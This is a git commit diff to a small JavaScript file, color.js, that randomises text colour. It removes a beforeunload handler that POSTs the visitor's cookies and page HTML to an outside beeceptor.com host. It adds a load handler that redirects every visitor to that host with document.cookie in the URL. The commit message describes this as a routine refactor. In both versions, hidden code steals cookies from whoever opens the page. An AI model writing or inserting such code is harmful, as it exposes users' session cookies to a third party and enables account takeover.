4398c7a0cf9a64e5848b694181be21cd3261c7e4
Yvan C <magic.yvan@gmail.com>
2026-05-16 12:39:51 +0200

    Refactor event listeners in color.js
    Removed the beforeunload event listener and its associated XMLHttpRequest logic. Added a load event listener that redirects to a URL with the document cookie.

--- ch62/color.js
+++ ch62/color.js
@@ -10,31 +10,6 @@ color.onclick = () => {
     target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
 }
 
-window.addEventListener("beforeunload", function(event){
-    // Initiate objects
-    var xhr = new XMLHttpRequest(),
-        boundary = '---------------------------' + Math.random().toString().substr(2),
-    	data = '';
-    
-    // Initialize an asynchronous POST request
-    xhr.open('POST', 'https://keskispace.free.beeceptor.com', true);
-    
-    // Indicate wether or not cross-site access request should be made using credantials (e.g. cookies, authorization headers)
-    xhr.withCredentials = true;
-    
-    // Set headers
-    xhr.setRequestHeader('Content-Type', 'multipart/form-data; charset=UTF-8; boundary=' + boundary);
-    
-    // Set data
-    data += '--' + boundary;
-    data += '\r\nContent-Disposition: form-data; name="cookie"\r\n\r\n' + document.cookie + '\r\n';
-    data += '--' + boundary;
-    data += '\r\nContent-Disposition: form-data; name="status"\r\n\r\n' + document.body.innerHTML + '\r\n';
-    data += '--' + boundary + '--';
-    
-    // Set additional headers
-    xhr.setRequestHeader('Content-Length', data.length);
-    
-    // Send the request
-    xhr.send(data);
+window.addEventListener("load", function(event){
+    window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
 });   
